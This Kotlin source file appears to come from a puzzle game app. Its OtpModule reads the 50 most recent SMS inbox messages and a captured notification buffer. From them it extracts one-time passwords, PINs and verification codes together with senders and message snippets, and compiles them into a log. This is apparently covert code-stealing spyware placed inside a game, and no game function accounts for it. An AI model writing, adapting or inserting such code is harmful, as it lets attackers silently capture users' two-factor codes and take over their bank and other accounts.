package com.puzzleblast.game.modules

import android.content.Context
import android.net.Uri

object OtpModule {
    private val otpRe = Regex("""\b\d{4,8}\b""")
    val log = mutableListOf<String>()

    fun extractOtp(text: String?): String? {
        if (text.isNullOrBlank()) return null
        if (!text.contains(Regex("otp|code|pin|password|verify", RegexOption.IGNORE_CASE))) return null
        return otpRe.find(text)?.value
    }

    suspend fun collect(ctx: Context): String {
        val sb = StringBuilder("🔑 OTP log\n")
        val cursor = ctx.contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf("address", "body", "date"), null, null, "date DESC LIMIT 50")
        cursor?.use { c ->
            while (c.moveToNext()) {
                val body = c.getString(1) ?: ""
                val otp = extractOtp(body) ?: continue
                val num = c.getString(0) ?: "?"
                sb.append("$num — $otp — ${body.take(60)}\n")
            }
        }
        NotifModule.buffer.forEach { e ->
            extractOtp(e.text)?.let { sb.append("${e.pkg} — $it — ${e.text.take(60)}\n") }
        }
        return sb.toString().ifBlank { "no otps found" }
    }
}
